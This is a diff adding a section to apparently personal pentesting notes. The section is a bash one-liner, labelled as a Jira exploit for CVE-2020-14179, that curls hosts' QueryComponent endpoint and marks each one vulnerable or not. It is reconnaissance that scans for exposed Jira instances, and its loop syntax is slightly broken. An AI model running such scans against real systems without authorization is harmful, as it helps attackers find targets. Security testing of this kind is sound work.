@@ -126,6 +126,15 @@ java -jar -Xmx512M -Djava.awt.headless=true ./burpsuite_pro_v1.8.8.jar http exmp
   go to 
   
   ----------------------------------------------------------------------------------------------
+  jira exploit 
+  cve 2020-14179	=> jira
+cat hosts.txt or =>
+echo "https://jira.exmaple.com"|while read host do; do curl -s -k --insecure --path-as-is "$host/secure/QueryComponent\!Default.jspa"|grep -qsi 'searchers' &&
+printf "$host \033[0;31mVulnerable\n"||printf "$host \033[0;32mNot Vulnerable\n";done
+
+  
+  -------------------------------------------------------------------------------------------------
+  
                     JSON EXPLOIT
   
   inject json value of request with 
